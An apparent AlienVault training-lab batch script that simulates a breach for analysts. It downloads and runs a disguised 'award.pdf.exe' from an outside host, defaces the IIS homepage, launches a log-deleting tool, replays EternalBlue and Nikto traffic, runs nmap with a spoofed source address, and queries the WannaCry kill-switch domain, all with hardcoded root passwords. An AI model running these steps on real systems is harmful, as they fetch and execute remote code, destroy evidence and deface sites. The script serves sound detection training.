@echo off
REM joriordan@alienvault.com
echo Enter the Fully Qualified Domain name (not URL)
echo Example: training-eu-1-20170101.alienvault.cloud
set /p domain=Enter Domain: 
echo Downloading award.pdf.exe
bitsadmin /transfer download_file /download /priority normal http://alien-training.com/award.pdf.exe C:\Users\Administrator\Downloads\award.pdf.exe > NUL
echo Running award.pdf.exe
START C:\Users\Administrator\Downloads\award.pdf.exe
echo Defacing website
timeout /t 10
(echo ^<html^>
echo ^<head^>
echo ^<title^>AlienVault Lab Test Homepage^</title^>
echo ^</head^>
echo ^<body^>
echo ^<img src="AV-Corporate-Logo.svg" alt="AlienVault" width="480" height="300" /^>^</a^>
echo ^<h1^> YOU HAVE BEEN BREACHED !! ^</h1^>
echo ^<br^>^<br^>^<br^>
echo ^<a href="/sub/blue.htm"^>Go to ^>^>^>^>^> BLUE^</a^>
echo ^<br^>
echo ^<a href="/sub/red.htm"^>Go to ^>^>^>^>^> RED^</a^>
echo ^<br^>
echo ^<a href="/sub/green.htm"^>Go to ^>^>^>^>^> GREEN^</a^>
echo ^</body^>
echo ^</html^> ) > C:\inetpub\wwwroot\index.htm
echo Deleting event log
timeout /t 5
START C:\Users\Administrator\Desktop\scripts\Backup_Delete_Event_Log.exe
echo Accessing online services
timeout /t 10
plink.exe root@192.168.250.13 -pw Password1! tcpreplay --topspeed -i eth0 scripts/DesktopSoftware.pcap
cls
echo Launching attack
timeout /t 20 /nobreak > NUL
plink.exe root@192.168.250.13 -pw Password1! tcpreplay --topspeed -i eth0 scripts/eternalblue.pcap
ipconfig /flushdns
nslookup iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
cls
echo Launching Recon
timeout /t 20 /nobreak > NUL
plink.exe root@192.168.250.13 -pw Password1! tcpreplay --topspeed -i eth0 scripts/nikto2.pcap
plink.exe root@192.168.250.13 -pw Password1! nmap -e eth0 -Pn -S 46.4.123.15 192.168.250.17
plink.exe root@192.168.250.13 -pw Password1! nmap -e eth0 -Pn -S 46.4.123.15 192.168.250.17
cls
echo Visting bad website
timeout /t 20 /nobreak > NUL
ipconfig /flushdns
nslookup blacklistthisdomain.com
cls
plink.exe root@192.168.250.13 -pw Password1! /root/scripts/resetScripts/analyst_lab4.py -d %domain% -u usm-anywhere-training@alienvault.com -p Password1!
pause
